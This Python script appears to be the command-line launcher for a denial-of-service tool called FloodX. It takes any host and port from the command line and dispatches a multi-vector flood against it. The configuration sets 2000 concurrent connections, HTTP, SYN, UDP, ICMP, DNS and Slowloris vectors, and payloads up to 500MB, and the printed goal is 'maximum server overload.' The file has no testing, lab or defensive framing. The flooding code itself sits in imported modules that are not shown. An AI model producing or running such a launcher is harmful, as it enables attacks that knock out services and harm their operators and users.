#!/usr/bin/env python3
"""
FloodX: OVERWHELMING MULTI-VECTOR ATTACK LAUNCHER
Automatically launches massive multi-vector attacks for maximum impact.
"""

import asyncio
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src', 'python'))

from src.python.orchestrator.dispatcher import AttackDispatcher
from src.python.common.logger import logger

def get_overwhelming_config(target: str, duration: int = 300):
    """Get configuration for overwhelming multi-vector attack."""
    # Auto-detect port from target
    if ':' in target:
        host, port = target.split(':')
        port = int(port)
    else:
        host = target
        port = 80  # Default HTTP port
    
    return {
        'target': host,
        'port': port,
        'vector': 'all',  # This triggers multi-vector mode
        'duration': duration,
        'concurrency': 2000,  # INCREASED concurrency for maximum impact
        'auto_multi': True,   # Force multi-vector mode
        'advanced': True,     # Enable all advanced features
        'massive_payloads': True,  # Enable massive data transmission
        'profile': 'overwhelming',  # Use overwhelming attack profile
        'payload_multiplier': 10,   # Multiply payload sizes by 10x
        'max_payload_size': 1024 * 1024 * 500  # 500MB max payload size
    }

async def launch_overwhelming_attack(target: str, duration: int = 300):
    """Launch an overwhelming multi-vector attack."""
    logger.info("🚀 LAUNCHING OVERWHELMING MULTI-VECTOR ATTACK")
    logger.info(f"🎯 Target: {target}")
    logger.info(f"⏱️  Duration: {duration} seconds")
    logger.info("💥 Attack Vectors: HTTP, SYN, WebSocket, TLS, Slowloris, UDP, ICMP, DNS")
    logger.info("📊 Expected Data Transmission: 100GB+ (depending on duration)")
    logger.info("🔥 Attack Intensity: MAXIMUM OVERWHELMING")
    
    config = get_overwhelming_config(target, duration)
    dispatcher = AttackDispatcher()
    
    try:
        await dispatcher.dispatch(config)
        logger.info("✅ Overwhelming attack completed successfully!")
    except Exception as e:
        logger.error(f"❌ Attack failed: {e}")

def main():
    """Main launcher function."""
    if len(sys.argv) < 2:
        print("Usage: python overwhelming_attack.py <target> [duration_seconds]")
        print("Example: python overwhelming_attack.py example.com 300")
        print("Example: python overwhelming_attack.py 192.168.1.100 600")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 300
    
    print("=" * 80)
    print("🚀 FLOODX OVERWHELMING ATTACK LAUNCHER")
    print("=" * 80)
    print(f"Target: {target}")
    print(f"Duration: {duration} seconds")
    print("Attack Profile: OVERWHELMING MULTI-VECTOR")
    print("Expected Result: Maximum server overload with 100GB+ data transmission")
    print("=" * 80)
    
    try:
        asyncio.run(launch_overwhelming_attack(target, duration))
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
    except Exception as e:
        print(f"❌ Launch failed: {e}")

if __name__ == "__main__":
    main()
